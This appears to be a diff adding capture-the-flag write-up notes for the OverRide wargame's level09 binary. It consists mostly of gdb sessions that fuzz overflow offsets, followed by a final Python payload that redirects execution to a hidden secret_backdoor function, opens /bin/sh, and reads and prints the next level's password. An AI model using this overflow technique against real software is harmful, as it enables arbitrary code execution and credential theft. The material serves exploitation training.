@@ -1,0 +1,237 @@
+level09@OverRide:~$ checksec --file level09
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   level09
+
+struct  c 
+
+ 8d2:   48 05 8c 00 00 00       add    $0x8c,%rax
+ 8d8:   48 c7 00 00 00 00 00    movq   $0x0,(%rax)
+ 8df:   48 c7 40 08 00 00 00    movq   $0x0,0x8(%rax)
+ 8e6:   00
+ 8e7:   48 c7 40 10 00 00 00    movq   $0x0,0x10(%rax)
+ 8ee:   00
+ 8ef:   48 c7 40 18 00 00 00    movq   $0x0,0x18(%rax)
+ 8f6:   00
+ 8f7:   48 c7 40 20 00 00 00    movq   $0x0,0x20(%rax)
+ 8fe:   00
+
+typedef struct s_message {
+    char text[140];     // read via strncpy()
+    char username[40];  // written 1 char at a time
+    int  len;           // always 140
+} t_message;
+
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa = 41 - 1 = 40 car il  faut  ecrire un octer de  redirection  
+
+
+a5f:   88 8c 02 8c 00 00 00    mov    %cl,0x8c(%rdx,%rax,1)
+9a9:   8b 80 b4 00 00 00       mov    0xb4(%rax),%eax
+
+Offset 0x00 → text
+Offset 0x8C → username
+Offset 0xB4 → len
+Total       → 0xB8, aligné à 0xC0
+
+
+
+(gdb) r < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/users/level09/level09 < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000000000a in ?? ()
+(gdb) info register rbp
+rbp            0x4343434343434343       0x4343434343434343
+(gdb) r < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 50')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/users/level09/level09 < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 50')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555554931 in handle_msg ()
+(gdb) info register rbp
+rbp            0x4343434343434343       0x4343434343434343
+(gdb) r < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 40')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/users/level09/level09 < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 40')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555554931 in handle_msg ()
+(gdb) info register rbp
+rbp            0x4343434343434343       0x4343434343434343
+(gdb) r < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 25')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/users/level09/level09 < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 25')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555554931 in handle_msg ()
+(gdb) info register rbp
+rbp            0x4343434343434343       0x4343434343434343
+(gdb) r < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 10')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/users/level09/level09 < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 10')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555554931 in handle_msg ()
+(gdb) r < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 4')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/users/level09/level09 < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 4')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000a44444444 in ?? ()
+(gdb) r < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 5')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/users/level09/level09 < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 5')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000a4444444444 in ?? ()
+(gdb) r < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 7')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/users/level09/level09 < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 7')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555554931 in handle_msg ()
+(gdb) r < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 6')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/users/level09/level09 < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 6')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555554931 in handle_msg ()
+(gdb) r < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 5')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/users/level09/level09 < <(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 150 + "C" * 50 + "D" * 5')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000a4444444444 in ?? ()
+(gdb)
+
+
+
+0x00000a4444444444 in ?? ()
+(gdb) info register rbp
+rbp            0x4343434343434343       0x4343434343434343
+
+
+(python -c 'print "A"*40 + "\xff" + "\n" + "B" * 205')
+
+
+Dump of assembler code for function secret_backdoor:
+   0x000055555555488c <+0>:     push   %rbp
+   0x000055555555488d <+1>:     mov    %rsp,%rbp
+   0x0000555555554890 <+4>:     add    $0xffffffffffffff80,%rsp
+   0x0000555555554894 <+8>:     mov    0x20171d(%rip),%rax        # 0x555555755fb8
+   0x000055555555489b <+15>:    mov    (%rax),%rax
+   0x000055555555489e <+18>:    mov    %rax,%rdx
+   0x00005555555548a1 <+21>:    lea    -0x80(%rbp),%rax
+   0x00005555555548a5 <+25>:    mov    $0x80,%esi
+   0x00005555555548aa <+30>:    mov    %rax,%rdi
+   0x00005555555548ad <+33>:    callq  0x555555554770 <fgets@plt>
+   0x00005555555548b2 <+38>:    lea    -0x80(%rbp),%rax
+   0x00005555555548b6 <+42>:    mov    %rax,%rdi
+   0x00005555555548b9 <+45>:    callq  0x555555554740 <system@plt>
+   0x00005555555548be <+50>:    leaveq
+   0x00005555555548bf <+51>:    retq
+End of assembler dump.
+
+
+
+
+level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "/bin/sh"'; cat ) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
